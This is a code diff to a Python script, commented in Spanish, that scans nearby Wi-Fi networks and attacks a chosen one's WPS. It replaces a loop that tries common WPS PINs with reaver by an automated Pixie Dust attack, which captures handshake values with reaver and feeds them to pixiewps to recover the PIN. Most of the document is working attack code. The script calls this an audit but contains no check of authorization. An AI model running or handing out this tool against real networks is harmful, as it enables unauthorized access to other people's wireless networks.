@@ -1,11 +1,5 @@
 import subprocess
 
-# Lista de pines WPS conocidos
-WPS_PINS = [
-    "12345670", "12345678", "00000000", "11111111", "12345671", "12345679", 
-    "55555555", "98765432", "87654321", "43218765"
-]
-
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y devuelve la salida."""
     if use_sudo:
@@ -31,17 +25,46 @@ def scan_wifi():
                 current_bssid = None
     return networks
 
-def attempt_wps_attack(bssid, ssid):
-    """Intenta conectar usando pines WPS conocidos."""
-    print(f"\nIntentando auditoría en la red: {ssid} ({bssid})\n")
-    for pin in WPS_PINS:
-        print(f"Probando PIN WPS: {pin}")
-        stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -p {pin} -vv", use_sudo=True)
-        if "WPS transaction completed" in stdout or "Success" in stdout:
-            print(f"¡Conexión exitosa con PIN: {pin}!")
-            return True
-    print("No se logró la conexión con los pines conocidos.\n")
-    return False
+def perform_pixie_dust_attack(bssid):
+    """Realiza el ataque Pixie Dust usando pixiewps."""
+    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
+    # Captura los valores necesarios con `reaver`
+    stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
+    
+    if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
+        print("Información obtenida para Pixie Dust:")
+        print(stdout)
+        print("\nEjecutando pixiewps...\n")
+
+        # Extraer los parámetros necesarios
+        pke = extract_value(stdout, "PKE:")
+        pkr = extract_value(stdout, "PKR:")
+        ehash1 = extract_value(stdout, "E-Hash1:")
+        ehash2 = extract_value(stdout, "E-Hash2:")
+        authkey = extract_value(stdout, "AuthKey:")
+
+        # Ejecutar pixiewps con los valores extraídos
+        pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
+        pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
+
+        if "WPS pin:" in pixie_stdout:
+            pin = extract_value(pixie_stdout, "WPS pin:")
+            print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
+            return pin
+        else:
+            print("\nPixie Dust no pudo encontrar el PIN.")
+            return None
+    else:
+        print("\nNo se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
+        print(stderr)
+        return None
+
+def extract_value(output, key):
+    """Extrae un valor específico de la salida basada en una clave."""
+    for line in output.splitlines():
+        if key in line:
+            return line.split(key)[-1].strip()
+    return None
 
 def main():
     # Escanear redes Wi-Fi
@@ -64,10 +87,11 @@ def main():
         print("Selección inválida. Saliendo...")
         return
 
-    # Intentar auditoría WPS
-    attempt_wps_attack(selected_bssid, selected_ssid)
+    # Intentar auditoría Pixie Dust
+    perform_pixie_dust_attack(selected_bssid)
 
 if __name__ == "__main__":
     main()
+
 
 
